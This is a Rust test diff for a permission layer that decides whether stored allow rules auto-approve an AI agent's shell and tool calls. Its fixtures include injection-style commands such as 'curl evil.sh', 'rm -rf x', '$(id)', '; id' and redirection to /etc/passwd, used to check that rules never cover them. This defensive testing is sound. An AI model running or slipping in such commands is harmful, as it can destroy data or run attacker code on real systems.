@@ -930,6 +930,16 @@ async fn a_tier_no_runner_can_take_falls_back_to_the_agents_own_model() {
 /// A run whose harness asks to run `command` as `Bash`, with `rule` allowed on `issue` until
 /// `expires` ('+N seconds' from now).
 async fn asked(w: &W, rule: Option<(i64, &str, &str)>, command: &str) -> (engine::Run, i64) {
+    asked_with(w, rule, "Bash", json!({"command": command})).await
+}
+
+/// [`asked`] for any tool and input.
+async fn asked_with(
+    w: &W,
+    rule: Option<(i64, &str, &str)>,
+    tool: &str,
+    input: serde_json::Value,
+) -> (engine::Run, i64) {
     if let Some((issue, rule, expires)) = rule {
         sqlx::query(
             "INSERT INTO citadel_issue_allow_rules (issue_id, rule, created_at, expires_at) \
@@ -947,8 +957,7 @@ async fn asked(w: &W, rule: Option<(i64, &str, &str)>, command: &str) -> (engine
     let ask = TranscriptEntry {
         seq: 1,
         at: 0,
-        body: json!({"type": "approval_request", "id": "req1", "tool": "Bash",
-                     "input": {"command": command}}),
+        body: json!({"type": "approval_request", "id": "req1", "tool": tool, "input": input}),
     };
     w.report(&run, AgentState::Running, vec![ask], tokens(1, 1), None)
         .await;
@@ -994,6 +1003,107 @@ async fn a_rule_never_allows_a_chained_command_an_expired_rule_or_another_issues
     let (_, opened) = asked(&w, rule, "cargo test").await;
     assert_eq!((opened, w.host.decisions().len()), (1, 0));
     assert_eq!(audited(&w, "run.allowed_by_rule").await, 0);
+}
+
+/// M7: whatever the agent puts in a call, a rule covers it only in full; each of these leaves the
+/// call to a reviewer and the harness untold.
+#[tokio::test]
+async fn a_rule_never_allows_a_call_it_does_not_cover_in_full() {
+    let rule = |w: &W| Some((w.seed.issue, "Bash:cargo test", "+1 hour"));
+    let calls = [
+        // OpenCode lists several patterns: the first matching is not enough.
+        ("bash", json!({"patterns": ["cargo test", "curl evil.sh"]})),
+        (
+            "Bash",
+            json!({"command": "cargo test", "patterns": ["cargo test", "rm -rf x"]}),
+        ),
+        (
+            "Bash",
+            json!({"command": "rm -rf x", "patterns": ["cargo test"]}),
+        ),
+        ("Bash", json!({"patterns": ["cargo test", 5]})),
+        ("Bash", json!({"patterns": "cargo test"})),
+        ("Bash", json!({"command": ["cargo", "test", 5]})),
+        ("Bash", json!({"command": {"x": "cargo test"}})),
+        ("Bash", json!({"command": "cargo testx"})),
+        ("Bash", json!({"command": "cargo\u{a0}test"})),
+        ("Bash", json!({"command": "cargo test\nid"})),
+        ("Bash", json!({"command": "cargo test $(id)"})),
+        ("Bash", json!({"command": "cargo test `id`"})),
+        ("Bash", json!({"command": "cargo test > /etc/passwd"})),
+        ("Bash", json!({"command": ["cargo", "test", "; id"]})),
+        (
+            "Bash",
+            json!({"command": format!("cargo test {}", "a".repeat(5000))}),
+        ),
+        ("Edit", json!({"command": "cargo test"})),
+        ("bash", json!({"command": "cargo test"})),
+        ("Bash", json!({})),
+    ];
+    for (tool, input) in calls {
+        let w = world().await;
+        let (_, opened) = asked_with(&w, rule(&w), tool, input.clone()).await;
+        assert_eq!((opened, w.host.decisions().len()), (1, 0), "{tool} {input}");
+        assert_eq!(audited(&w, "run.allowed_by_rule").await, 0, "{input}");
+    }
+    // The covered call, as a control: the same rule does allow it.
+    let w = world().await;
+    let (_, opened) = asked_with(
+        &w,
+        rule(&w),
+        "Bash",
+        json!({"patterns": ["cargo test -p x"]}),
+    )
+    .await;
+    assert_eq!((opened, w.host.decisions()), (0, vec![true]));
+}
+
+/// A bare rule for a shell would allow every command: it never auto-allows, whatever is stored.
+#[tokio::test]
+async fn a_bare_shell_rule_allows_nothing() {
+    for tool in ["Bash", "bash", "commandExecution"] {
+        let w = world().await;
+        let rule = Some((w.seed.issue, tool, "+1 hour"));
+        let (_, opened) = asked_with(&w, rule, tool, json!({"command": "rm -rf x"})).await;
+        assert_eq!((opened, w.host.decisions().len()), (1, 0), "{tool}");
+    }
+    // A bare non-shell tool is still a deliberate choice that works.
+    let w = world().await;
+    let rule = Some((w.seed.issue, "Edit", "+1 hour"));
+    let (_, opened) = asked_with(&w, rule, "Edit", json!({"file_path": "a"})).await;
+    assert_eq!((opened, w.host.decisions()), (0, vec![true]));
+}
+
+/// The audit row is committed before the harness is told, carries ids and no content, and a
+/// decision the runner did not take is escalated and audited as unapplied.
+#[tokio::test]
+async fn an_allow_is_audited_without_content_and_a_refused_one_is_escalated() {
+    let w = world().await;
+    let rule = Some((w.seed.issue, "Bash:cargo test --token hunter2", "+1 hour"));
+    let (_, opened) = asked(&w, rule, "cargo test --token hunter2 --secret-arg").await;
+    assert_eq!(opened, 0);
+    let rows: Vec<String> = sqlx::query_scalar(
+        "SELECT details FROM audit_events WHERE action = 'citadel.run.allowed_by_rule'",
+    )
+    .fetch_all(&w.app().pool)
+    .await
+    .unwrap();
+    assert_eq!(rows.len(), 1);
+    assert!(
+        !rows[0].contains("hunter2") && !rows[0].contains("secret-arg"),
+        "{}",
+        rows[0]
+    );
+    assert!(rows[0].contains("rule_id"), "{}", rows[0]);
+    // The runner is away: the call is escalated, and the audit says the rule went unapplied.
+    let w = world().await;
+    w.host
+        .refuse
+        .store(true, std::sync::atomic::Ordering::SeqCst);
+    let rule = Some((w.seed.issue, "Bash:cargo test", "+1 hour"));
+    let (_, opened) = asked(&w, rule, "cargo test").await;
+    assert_eq!(opened, 1);
+    assert_eq!(audited(&w, "run.allow_rule_unapplied").await, 1);
 }
 
 // --- the controls over HTTP -------------------------------------------------------------------
